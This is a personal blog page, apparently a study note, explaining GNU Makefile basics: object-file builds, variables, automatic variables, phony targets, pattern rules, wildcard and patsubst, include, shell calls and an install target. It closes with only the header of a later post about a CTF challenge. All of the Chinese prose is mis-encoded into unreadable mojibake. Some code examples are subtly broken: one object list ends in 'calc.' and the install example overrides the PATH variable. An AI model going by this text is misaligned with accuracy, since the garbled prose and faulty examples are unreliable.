<h2 id="ç¼–è¯‘æµç¨‹"><a href="#ç¼–è¯‘æµç¨‹" class="headerlink" title="ç¼–è¯‘æµç¨‹"></a>ç¼–è¯‘æµç¨‹</h2><p>é¦–å…ˆæ˜¯æŠŠå„ä¸ªæ–‡ä»¶å…ˆç¼–è¯‘æˆç›®æ ‡æ–‡ä»¶ï¼Œç„¶åå†ç»Ÿä¸€æŠŠç›®æ ‡æ–‡ä»¶è¿›è¡Œé“¾æ¥ï¼Œè¿™æ ·åšçš„å¥½å¤„å°±æ˜¯å½“ä¿®æ”¹äº†ä¸€ä¸ªæ–‡ä»¶ä¹‹åï¼Œåœ¨æ‰§è¡Œ<code>make</code>å¹¶ä¸ä¼šæŠŠæ‰€æœ‰æ–‡ä»¶å…¨éƒ¨å†ç¼–è¯‘ä¸€æ¬¡ï¼Œè€Œæ˜¯åªæŠŠæ”¹åŠ¨çš„å’Œæ”¹åŠ¨ç›¸å…³çš„ä»£ç å†ç¼–è¯‘ä¸€éã€‚</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">calc:add.o sub.o multi.o</span><br><span class="line">	gcc add.o sub.o multi.o calc.cpp -o calc</span><br><span class="line"></span><br><span class="line">add.o:add.cpp</span><br><span class="line">	gcc -c add.cpp -o add.o</span><br><span class="line"></span><br><span class="line">sub.o:sub.cpp</span><br><span class="line">	gcc -c sub.cpp -o sub.o</span><br><span class="line"></span><br><span class="line">multi.o:multi.cpp</span><br><span class="line">	gcc -c multi.cpp -o multi.o</span><br></pre></td></tr></table></figure>

<p><img src="C:\Users\å¼ é¹\AppData\Roaming\Typora\typora-user-images\image-20220907194008573.png" alt="image-20220907194008573"></p>
<h2 id="å˜é‡ä½¿ç”¨"><a href="#å˜é‡ä½¿ç”¨" class="headerlink" title="å˜é‡ä½¿ç”¨"></a>å˜é‡ä½¿ç”¨</h2><p><img src="C:\Users\å¼ é¹\AppData\Roaming\Typora\typora-user-images\image-20220907195303414.png" alt="image-20220907195303414"></p>
<p>å¯ä»¥è‡ªå®šä¹‰å˜é‡ï¼Œç„¶åç”¨$(å˜é‡å)æ¥ä½¿ç”¨è¿™ä¸ªå˜é‡</p>
<figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">OBJ=add.o sub.o multi.o calc.o</span><br><span class="line">TARGET=calc</span><br><span class="line"></span><br><span class="line"><span class="variable">$(TARGET)</span>:<span class="variable">$(OBJ)</span></span><br><span class="line">	gcc <span class="variable">$(OBJ)</span> -o <span class="variable">$(TARGET)</span></span><br><span class="line"></span><br><span class="line"><span class="section">add.o:add.cpp</span></span><br><span class="line">	gcc -c add.cpp -o add.o</span><br><span class="line"></span><br><span class="line"><span class="section">sub.o:sub.cpp</span></span><br><span class="line">	gcc -c sub.cpp -o sub.o</span><br><span class="line"></span><br><span class="line"><span class="section">multi.o:multi.cpp</span></span><br><span class="line">	gcc -c multi.cpp -o multi.o</span><br><span class="line"></span><br><span class="line"><span class="section">calc.o:calc.cpp</span></span><br><span class="line">	gcc -c calc.cpp -o calc.o</span><br><span class="line"></span><br><span class="line"><span class="section">clean:</span></span><br><span class="line">	rm -rf *.o calc</span><br></pre></td></tr></table></figure>

<p>å¯ä»¥ä½¿ç”¨ç³»ç»Ÿå˜é‡æ›´åŠ ç®€åŒ–</p>
<p>$^å°±æ˜¯æ‰€æœ‰ä¸é‡å¤çš„ä¾èµ–æ–‡ä»¶ä¹Ÿå°±æ˜¯<code>:</code>åé¢è·Ÿç€çš„å†…å®¹ï¼Œ$(TARGET)å†’å·åé¢æ˜¯å˜é‡<code>OBJ</code>,æ‰€ä»¥æ˜¯<code>add.o sub.o multi.o calc.o</code>,$@æ˜¯ç›®æ ‡æ–‡ä»¶çš„å®Œæ•´åç§°ï¼Œä¹Ÿå°±æ˜¯<code>$(TARGET)</code>,æœ€å<code>gcc $^ -o $@</code>=<code>gcc add.o sub.o multi.o calc.o -o calc</code></p>
<figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">OBJ=add.o sub.o multi.o calc.o</span><br><span class="line">TARGET=calc</span><br><span class="line"></span><br><span class="line"><span class="variable">$(TARGET)</span>:<span class="variable">$(OBJ)</span></span><br><span class="line">	gcc <span class="variable">$^</span> -o <span class="variable">$@</span></span><br><span class="line"></span><br><span class="line"><span class="section">add.o:add.cpp</span></span><br><span class="line">	gcc -c <span class="variable">$^</span> -o <span class="variable">$@</span></span><br><span class="line"></span><br><span class="line"><span class="section">sub.o:sub.cpp</span></span><br><span class="line">	gcc -c <span class="variable">$^</span> -o <span class="variable">$@</span></span><br><span class="line"></span><br><span class="line"><span class="section">multi.o:multi.cpp</span></span><br><span class="line">	gcc -c <span class="variable">$^</span> -o <span class="variable">$@</span></span><br><span class="line"></span><br><span class="line"><span class="section">calc.o:calc.cpp</span></span><br><span class="line">	gcc -c <span class="variable">$^</span> -o <span class="variable">$@</span></span><br><span class="line"></span><br><span class="line"><span class="section">clean:</span></span><br><span class="line">	rm -rf *.o <span class="variable">$(TARGET)</span></span><br></pre></td></tr></table></figure>

<p>ç„¶åè¿˜å¯ä»¥ä½¿ç”¨ç³»ç»Ÿå¸¸é‡æ¥å®Œæˆè·¨å¹³å°çš„ä¸€äº›æ•ˆæœ</p>
<figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">OBJ=add.o sub.o multi.o calc.o</span><br><span class="line">TARGET=calc</span><br><span class="line"></span><br><span class="line"><span class="variable">$(TARGET)</span>:<span class="variable">$(OBJ)</span></span><br><span class="line">	<span class="variable">$(CXX)</span> <span class="variable">$^</span> -o <span class="variable">$@</span></span><br><span class="line"></span><br><span class="line"><span class="section">add.o:add.cpp</span></span><br><span class="line">	<span class="variable">$(CXX)</span> -c <span class="variable">$^</span> -o <span class="variable">$@</span></span><br><span class="line"></span><br><span class="line"><span class="section">sub.o:sub.cpp</span></span><br><span class="line">	<span class="variable">$(CXX)</span> -c <span class="variable">$^</span> -o <span class="variable">$@</span></span><br><span class="line"></span><br><span class="line"><span class="section">multi.o:multi.cpp</span></span><br><span class="line">	<span class="variable">$(CXX)</span> -c <span class="variable">$^</span> -o <span class="variable">$@</span></span><br><span class="line"></span><br><span class="line"><span class="section">calc.o:calc.cpp</span></span><br><span class="line">	<span class="variable">$(CXX)</span> -c <span class="variable">$^</span> -o <span class="variable">$@</span></span><br><span class="line"></span><br><span class="line"><span class="section">clean:</span></span><br><span class="line">	<span class="variable">$(RM)</span> *.o <span class="variable">$(TARGET)</span></span><br></pre></td></tr></table></figure>

<h2 id="ä¼ªç›®æ ‡å’Œæ¨¡å¼åŒ¹é…"><a href="#ä¼ªç›®æ ‡å’Œæ¨¡å¼åŒ¹é…" class="headerlink" title="ä¼ªç›®æ ‡å’Œæ¨¡å¼åŒ¹é…"></a>ä¼ªç›®æ ‡å’Œæ¨¡å¼åŒ¹é…</h2><h3 id="ä¼ªç›®æ ‡"><a href="#ä¼ªç›®æ ‡" class="headerlink" title="ä¼ªç›®æ ‡"></a>ä¼ªç›®æ ‡</h3><p>æŒ‰ç…§æˆ‘çš„ç†è§£ï¼Œå¯èƒ½å¹¿ä¹‰ä¸Šæ¥è¯´ç›®æ ‡å°±æ˜¯æŒ‡è¿™ä¸ªç›®æ ‡çš„å‘½ä»¤æ‰§è¡Œåæœ€åäº§ç”Ÿçš„æ–‡ä»¶åï¼Œä¸€èˆ¬<code>make clean</code>å°±æ˜¯æ‰§è¡Œcleanç›®æ ‡çš„å‘½ä»¤ï¼Œå¦‚æœåœ¨å½“å‰ç›®å½•ä¸‹touchäº†ä¸€ä¸ªcleanæ–‡ä»¶ï¼Œç„¶åå†æ‰§è¡Œ<code>make clean</code>ä¼šå‘ç°æ²¡æœ‰æ‰§è¡Œå‘½ä»¤ï¼ŒåŸå› å°±æ˜¯makeè®¤ä¸ºcleanæ–‡ä»¶å°±æ˜¯ç›®æ ‡ï¼Œå·²ç»å­˜åœ¨è€Œä¸”æ²¡æœ‰æ›´æ–°æ‰€ä»¥ä¸éœ€è¦æ‰§è¡Œå‘½ä»¤äº†ã€‚</p>
<p>å¯¹äºè¿™ç§æƒ…å†µå°±å¾—å£°æ˜<code>clean</code>ä¸ºä¼ªç›®æ ‡äº†ï¼Œæ‰€ä»¥å¯ä»¥çœ‹å‡ºå½“å½“å‰ç›®æ ‡ä¸ç”Ÿæˆå¯¹åº”æ–‡ä»¶ï¼Œè€Œæ˜¯ä¸€ç§åŠŸèƒ½ç›®æ ‡æ—¶å°±åº”è¯¥æŠŠä»–å£°æ˜æˆä¼ªç›®æ ‡ã€‚</p>
<p><img src="C:\Users\å¼ é¹\AppData\Roaming\Typora\typora-user-images\image-20220907201801523.png" alt="image-20220907201801523"></p>
<h3 id="æ¨¡å¼åŒ¹é…"><a href="#æ¨¡å¼åŒ¹é…" class="headerlink" title="æ¨¡å¼åŒ¹é…"></a>æ¨¡å¼åŒ¹é…</h3><p><img src="C:\Users\å¼ é¹\AppData\Roaming\Typora\typora-user-images\image-20220907204648885.png" alt="image-20220907204648885"></p>
<p>æ„Ÿè§‰è¿™ä¸ªè§„åˆ™è¿˜æ˜¯å¾ˆæ–¹ä¾¿çš„ï¼Œå°±æ‹¿ä¸Šé¢çš„makefileæ¥è¯´ï¼Œå¯ä»¥ä¿®æ”¹æˆä¸‹é¢çš„æ ·å­,makefileå°±ç¼©çŸ­æˆå‡ è¡Œçš„æ ·å­äº†ï¼Œè‡³äºè¿™æ¡è§„åˆ™çš„åŸç†ï¼Œå¤§æ¦‚å°±æ˜¯ä»–ä¼šç”Ÿæˆç¬¬ä¸€ä¸ªç›®æ ‡ä¹Ÿå°±æ˜¯<code>$(TARGET):$(OBJ)</code>ï¼Œç„¶åå‘ç°<code>add.o sub.o multi.o calc.o</code>è¿™äº›ä¾èµ–æ–‡ä»¶éƒ½æ²¡æœ‰ç”Ÿæˆï¼Œç„¶åå°±ä¼šå»æ‰¾ç”Ÿæˆè¿™äº›æ–‡ä»¶çš„ç›®æ ‡ï¼Œé¦–å…ˆæ˜¯ç¬¬ä¸€ä¸ª<code>add.o</code>ï¼Œ<code>%.o:%.cpp</code>ç›®æ ‡å°±èƒ½åŒ¹é…ï¼Œç„¶åå°±ä¼šæ‰§è¡Œè¿™ä¸ªç›®æ ‡çš„å‘½ä»¤ï¼Œè¿›è€Œç”Ÿæˆ<code>add.o</code>,å…¶ä»–æ‰€æœ‰çš„ç›®æ ‡æ–‡ä»¶ä¹Ÿæ˜¯è¿™æ ·ç”Ÿæˆï¼Œæœ€åç”Ÿæˆ<code>calc</code>ã€‚</p>
<p>é€šè¿‡è¿™ä¸ªæ¨¡å¼åŒ¹é…ï¼Œæ„Ÿè§‰makefileå°±æ˜¯ä¸€å±‚å¥—ä¸€å±‚ï¼Œç„¶åä»æœ€åº•å±‚å¾€ä¸Šæ‰¾ï¼Œç›´åˆ°æœ€åº•å±‚çš„ä¾èµ–å…¨ç¨‹éƒ½æœ‰äº†ï¼Œå†æ‰§è¡Œæœ€åº•å±‚çš„å‘½ä»¤ã€‚æœ‰ç‚¹é€’å½’é‚£å‘³äº†ã€‚</p>
<figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">OBJ=add.o sub.o multi.o calc.</span><br><span class="line">TARGET=calc</span><br><span class="line"></span><br><span class="line"><span class="variable">$(TARGET)</span>:<span class="variable">$(OBJ)</span></span><br><span class="line">	<span class="variable">$(CXX)</span> <span class="variable">$^</span> -o <span class="variable">$@</span></span><br><span class="line"></span><br><span class="line"><span class="section">%.o:%.cpp</span></span><br><span class="line">	<span class="variable">$(CXX)</span> -c <span class="variable">$^</span> -o <span class="variable">$@</span></span><br><span class="line"></span><br><span class="line"><span class="section">clean:</span></span><br><span class="line">	<span class="variable">$(RM)</span> *.o <span class="variable">$(TARGET)</span></span><br></pre></td></tr></table></figure>

<p>è¿™ä¸ªmakefileè¿˜å¯ä»¥åˆ©ç”¨<code>wildcard</code>å’Œ<code>patsubst</code>æ¥å¢åŠ makefileçš„æ³›ç”¨æ€§</p>
<figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#OBJ= sub.o multi.o calc.o add.o</span></span><br><span class="line">OBJ=<span class="variable">$(<span class="built_in">patsubst</span> %.cpp,%.o,$(<span class="built_in">wildcard</span> ./*.cpp)</span>)</span><br><span class="line">TARGET=calc</span><br><span class="line"></span><br><span class="line"><span class="variable">$(TARGET)</span>:<span class="variable">$(OBJ)</span></span><br><span class="line">	<span class="variable">$(CXX)</span> <span class="variable">$^</span> -o <span class="variable">$@</span></span><br><span class="line"></span><br><span class="line"><span class="section">%.o:%.cpp</span></span><br><span class="line">	<span class="variable">$(CXX)</span> -c <span class="variable">$^</span> -o <span class="variable">$@</span></span><br><span class="line"></span><br><span class="line"><span class="section">clean:</span></span><br><span class="line">	<span class="variable">$(RM)</span> *.o <span class="variable">$(TARGET)</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="ç¼–è¯‘åŠ¨æ€é“¾æ¥åº“"><a href="#ç¼–è¯‘åŠ¨æ€é“¾æ¥åº“" class="headerlink" title="ç¼–è¯‘åŠ¨æ€é“¾æ¥åº“"></a>ç¼–è¯‘åŠ¨æ€é“¾æ¥åº“</h2><p>æ„Ÿè§‰ã€‚ã€‚ã€‚æ²¡å•¥ã€‚ã€‚ã€‚ã€‚ï¼Œå’Œmakefileå…³ç³»ä¸å¤§</p>
<p><img src="C:\Users\å¼ é¹\AppData\Roaming\Typora\typora-user-images\image-20220907215742516.png" alt="image-20220907215742516"></p>
<h2 id="é€šç”¨éƒ¨åˆ†åšå…¬å…±å¤´æ–‡ä»¶"><a href="#é€šç”¨éƒ¨åˆ†åšå…¬å…±å¤´æ–‡ä»¶" class="headerlink" title="é€šç”¨éƒ¨åˆ†åšå…¬å…±å¤´æ–‡ä»¶"></a>é€šç”¨éƒ¨åˆ†åšå…¬å…±å¤´æ–‡ä»¶</h2><p>makefileè¿˜æœ‰è‡ªåŠ¨æ¨å¯¼èƒ½åŠ›ï¼Œä¸Šé¢çš„makefileè¿˜å¯ä»¥ç®€çŸ­åˆ°ä»¥ä¸‹å‡ è¡Œ</p>
<figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#OBJ= sub.o multi.o calc.o add.o</span></span><br><span class="line">OBJ=<span class="variable">$(<span class="built_in">patsubst</span> %.cpp,%.o,$(<span class="built_in">wildcard</span> ./*.cpp)</span>)</span><br><span class="line">TARGET=calc</span><br><span class="line"></span><br><span class="line"><span class="variable">$(TARGET)</span>:<span class="variable">$(OBJ)</span></span><br><span class="line">	<span class="variable">$(CXX)</span> <span class="variable">$^</span> -o <span class="variable">$@</span></span><br><span class="line"></span><br><span class="line"><span class="section">clean:</span></span><br><span class="line">	<span class="variable">$(RM)</span> *.o <span class="variable">$(TARGET)</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>makefileè¿˜èƒ½åµŒå¥—makefile,é‚£å°±å¯ä»¥æŠŠé€šç”¨çš„å†…å®¹å†™åœ¨ä¸€ä¸ªmakefileä¸­ï¼Œç„¶ååœ¨å…¶ä»–makefileä¸­ä½¿ç”¨ï¼Œå¦‚ä¸‹ä¾‹</p>
<figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">TARGET=c</span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span> ../makefile</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#å…¬å…±</span></span><br><span class="line"></span><br><span class="line">SOURCE=<span class="variable">$(<span class="built_in">wildcard</span>  ./*.cpp ./*.c)</span></span><br><span class="line">OBJ=<span class="variable">$(<span class="built_in">patsubst</span>  %.cpp,%.o,<span class="variable">$(SOURCE)</span>)</span></span><br><span class="line">OBJ:=<span class="variable">$(<span class="built_in">patsubst</span>  %.c,%.o,<span class="variable">$(OBJ)</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="meta"><span class="meta-keyword">.PHONY</span>:clean</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$(TARGET)</span>:<span class="variable">$(OBJ)</span></span><br><span class="line">	<span class="variable">$(CXX)</span> <span class="variable">$^</span> -o <span class="variable">$@</span></span><br><span class="line">	</span><br><span class="line"><span class="section">clean:</span></span><br><span class="line">	<span class="variable">$(RM)</span> <span class="variable">$(TARGET)</span> <span class="variable">$(OBJ)</span></span><br><span class="line">	</span><br><span class="line"><span class="section">show:</span></span><br><span class="line">	echo <span class="variable">$(SOURCE)</span></span><br><span class="line">	echo <span class="variable">$(OBJ)</span></span><br></pre></td></tr></table></figure>

<p>åœ¨makefileä¸­éƒ½æ˜¯å…ˆè§£ææ‰€æœ‰å˜é‡ç„¶åå†æ‰§è¡Œå‘½ä»¤çš„ï¼Œæ‰€ä»¥å˜é‡çš„å£°æ˜æ”¾åœ¨å“ªé‡Œéƒ½æ˜¯æ²¡æœ‰æ‰€è°“çš„ã€‚</p>
<p><code>=</code>,èµ‹å€¼æ“ä½œï¼ŒæŠŠç»ˆå€¼èµ‹å€¼ç»™å˜é‡ï¼Œæ³¨æ„ä¸èƒ½å­—èŠ‚èµ‹å€¼ç»™å­—èŠ‚ï¼Œæ¯”å¦‚Y=$(Y)</p>
<p><code>ï¼š=</code>ä¹Ÿæ˜¯èµ‹å€¼ï¼Œä½†æ˜¯ä¸<code>=</code>ä¸åŒçš„æ˜¯ä»–ä¸ä¼šå—åˆ°å®ƒä¸‹é¢çš„ä»£ç ä»¥åŠå˜é‡çš„å½±å“ã€‚</p>
<h2 id="è°ƒç”¨shell"><a href="#è°ƒç”¨shell" class="headerlink" title="è°ƒç”¨shell"></a>è°ƒç”¨shell</h2><p>åœ¨makefileä¸­å¯ä»¥ä½¿ç”¨<code>ifndef endif</code>æ¥æ·»åŠ é»˜è®¤å€¼</p>
<p>åœ¨makefileä¸­å¯ä»¥åœ¨ç›®æ ‡ä»¥å¤–æ‰§è¡Œshellå‘½ä»¤ï¼Œå¦‚ä¸‹</p>
<figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">A=<span class="variable">$(<span class="built_in">shell</span> ls)</span></span><br><span class="line"><span class="section">a:</span></span><br><span class="line">	echo <span class="variable">$(A)</span></span><br></pre></td></tr></table></figure>

<p>åœ¨makefileä¸­è¿˜å¯ä»¥è°ƒç”¨å…¶ä»–makefile,ä¸æ˜¯åƒä¸Šé¢é‚£æ ·çš„åŒ…å«ï¼Œè€Œæ˜¯è°ƒç”¨ï¼Œå› ä¸ºå¾ˆæœ‰æ—¶å€™ä¸åŒæ¨¡å—æœ‰ä¸åŒçš„makefile,è¦æƒ³ç›´æ¥å…¨éƒ¨å°±ä¸€èµ·ç¼–è¯‘ï¼Œå¯ä»¥å†å†™ä¸ªmakefileè°ƒç”¨ä»–ä»¬ï¼Œè°ƒç”¨è§„åˆ™å…¶å®å°±æ˜¯shellæŒ‡ä»¤</p>
<figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">a:</span></span><br><span class="line">	make -C ./makefile</span><br></pre></td></tr></table></figure>

<p><img src="C:\Users\å¼ é¹\AppData\Roaming\Typora\typora-user-images\image-20220908155748153.png" alt="image-20220908155748153"></p>
<h2 id="æ¡ä»¶åˆ¤æ–­-amp-å¾ªç¯"><a href="#æ¡ä»¶åˆ¤æ–­-amp-å¾ªç¯" class="headerlink" title="æ¡ä»¶åˆ¤æ–­&amp;å¾ªç¯"></a>æ¡ä»¶åˆ¤æ–­&amp;å¾ªç¯</h2><img src="C:\Users\å¼ é¹\AppData\Roaming\Typora\typora-user-images\image-20220908160944829.png" alt="image-20220908160944829" style="zoom:200%;" />

<p><img src="C:\Users\å¼ é¹\AppData\Roaming\Typora\typora-user-images\image-20220908161145932.png" alt="image-20220908161145932"></p>
<p><img src="C:\Users\å¼ é¹\AppData\Roaming\Typora\typora-user-images\image-20220908161321317.png" alt="image-20220908161321317"></p>
<p><img src="C:\Users\å¼ é¹\AppData\Roaming\Typora\typora-user-images\image-20220908163409283.png" alt="image-20220908163409283"></p>
<h2 id="è‡ªå®šä¹‰å‡½æ•°"><a href="#è‡ªå®šä¹‰å‡½æ•°" class="headerlink" title="è‡ªå®šä¹‰å‡½æ•°"></a>è‡ªå®šä¹‰å‡½æ•°</h2><p>å˜é‡ï¼Œif,å¾ªç¯å’Œå‡½æ•°éƒ½æœ‰äº†ï¼Œæ„Ÿè§‰å’Œä¸€é—¨è¯­è¨€éƒ½å·®ä¸å¤šäº†ã€‚</p>
<p><img src="C:\Users\å¼ é¹\AppData\Roaming\Typora\typora-user-images\image-20220908163840185.png" alt="image-20220908163840185"></p>
<h2 id="install"><a href="#install" class="headerlink" title="install"></a>install</h2><p><img src="C:\Users\å¼ é¹\AppData\Roaming\Typora\typora-user-images\image-20220908165302800.png" alt="image-20220908165302800"></p>
<p>ä¾‹å­ï¼ŒæŠŠäºŒè¿›åˆ¶ç¨‹åºæ”¾ç½®åœ¨ä¸€ä¸ªç›®å½•ä¸‹ï¼Œç„¶ååœ¨/binç›®å½•ä¸­æ”¾ä¸€ä¸ªäºŒè¿›åˆ¶ç¨‹åºçš„è½¯é“¾æ¥ï¼Œç„¶åå°±å¯ä»¥åœ¨ä»»ä½•ç›®å½•ä¸­è°ƒç”¨è¿™ä¸ªç¨‹åºäº†ã€‚</p>
<figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">TARGET:=006_main</span><br><span class="line">OBJ:=<span class="variable">$(TARGET)</span>.o</span><br><span class="line"></span><br><span class="line">CC:=g++</span><br><span class="line"></span><br><span class="line">PATH:=/tmp/006_main/</span><br><span class="line">BIN:=/usr/local/bin/</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$(TARGET)</span>:<span class="variable">$(OBJ)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="section">install:<span class="variable">$(TARGET)</span></span></span><br><span class="line">	if [ -d <span class="variable">$(PATH)</span> ];\</span><br><span class="line">		then echo <span class="variable">$(PATH)</span> exist; \</span><br><span class="line">	<span class="keyword">else</span> \</span><br><span class="line">	  	/bin/mkdir <span class="variable">$(PATH)</span>;\</span><br><span class="line">	  	/bin/cp <span class="variable">$(TARGET)</span> <span class="variable">$(PATH)</span>;\</span><br><span class="line">  		/bin/ln -sv <span class="variable">$(PATH)</span><span class="variable">$(TARGET)</span> <span class="variable">$(BIN)</span>;\</span><br><span class="line">  	fi;</span><br><span class="line"></span><br><span class="line"><span class="section">clean:</span></span><br><span class="line">	<span class="variable">$(RM)</span> <span class="variable">$(TARGET)</span> <span class="variable">$(OBJ)</span></span><br><span class="line">	<span class="variable">$(RM)</span> -rf <span class="variable">$(PATH)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta"><span class="meta-keyword">.PHONY</span>:clean install</span></span><br></pre></td></tr></table></figure>


      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/08/12/%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%8D%8A%E5%86%B3%E8%B5%9B-Smurfs%E5%A4%8D%E7%8E%B0/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="rootzhang">
      <meta itemprop="description" content="æˆ‘çš„åšå®¢">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="study">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/08/12/%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%8D%8A%E5%86%B3%E8%B5%9B-Smurfs%E5%A4%8D%E7%8E%B0/" class="post-title-link" itemprop="url">è“å¸½æ¯åŠå†³èµ› Smurfså¤ç°</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">å‘è¡¨äº</span>

              <time title="åˆ›å»ºæ—¶é—´ï¼š2022-08-12 21:57:21" itemprop="dateCreated datePublished" datetime="2022-08-12T21:57:21+08:00">2022-08-12</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">æ›´æ–°äº</span>
                <time title="ä¿®æ”¹æ—¶é—´ï¼š2022-08-18 22:47:26" itemprop="dateModified" datetime="2022-08-18T22:47:26+08:00">2022-08-18</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
